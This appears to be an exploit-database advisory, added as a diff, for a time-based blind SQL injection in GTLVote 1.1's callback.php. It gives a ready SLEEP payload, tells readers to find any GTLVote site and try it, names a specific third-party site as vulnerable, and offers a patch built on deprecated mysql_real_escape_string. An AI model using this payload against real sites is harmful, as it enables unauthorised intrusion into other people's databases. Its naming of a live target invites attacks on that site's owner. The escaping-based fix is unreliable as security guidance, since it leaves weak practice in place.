@@ -1,0 +1,67 @@
+id: 23954
+date: 08/04/2015
+title: GTLVote 1.1 SQL Injection Vulnerability
+author: Jackson
+cves: 
+
+##################
+[+] Exploit Title: GTLVote 1.1 SQLi Injection Vulnerability.
+[+] Discovered By: Jackson (Security Engineer @ Panel Solutions)
+[+] Worried about being attacked by a 0day? We secure your web applications before an attack occurs @ Secure Hosting Solution(http://panelsec.com/)
+[+] My Homepage: http://panelsec.com/
+[+] Date: [2015 28 July]
+[+] Vendor Homepage: GTLVote - GTLVote
+[+] Tested on: [GTL 1.x.x]
+###################
+
+
+POC(Proof Of Concept):
++++++++++++++++++++++++++
+1) Simply find a GLT site and go to the callback file and add /vote/php/callback.php?callback=1' AND (SELECT * FROM (SELECT(SLEEP(10)))bgus) AND 'jcaE'='jcaE
+2) If the site takes time to load it's vulnerable because of the sleep query
+3) Same Site:http://nexusrs.ca/voting/php/callback.php?callback=1' AND
+(SELECT * FROM (SELECT(SLEEP(10)))bgus) AND 'jcaE'='jcaE
+
+Sanitizing:
++++++++++++++++++++++++++
+Download a patched version here(All clients hosted with panel have already been patched)
+http://panelsec.com/vote/GTLVote1.2.zip
+
+
+Hard File Edit:
++++++++++++++++++++++++++
+
+
+1)
+public function setSiteVoted($ip, $type)
+{
+$type = intval($type);
+$query = "SELECT * FROM `voting_verification` WHERE `ip` = '" . $ip
+. "' AND `type`='" . $type . "'";
+$result = mysql_query($query);
+if (mysql_num_rows($result) == 0)
+{
+mysql_query("INSERT INTO `voting_verification` (`ip`, `type`)
+VALUES ('" . $ip . "', '" . $type . "')");
+}
+}
+
+callback isn't sanitized before being passed into setSiteVoted here is how to patch it.
+
+
+2)
+public function setSiteVoted($ip, $type)
+{
+$type = intval($type);
+$ip_clean = mysql_real_escape_string($ip);
+$query = "SELECT * FROM `voting_verification` WHERE `ip` = '"
+. $ip_clean . "' AND `type`='" . $type . "'";
+$result = mysql_query($query);
+if (mysql_num_rows($result) == 0)
+{
+mysql_query("INSERT INTO `voting_verification` (`ip`, `type`)
+VALUES ('" . $ip_clean . "', '" . $type . "')");
+}
+}
+
+#  0day.today [2023-03-21]  #
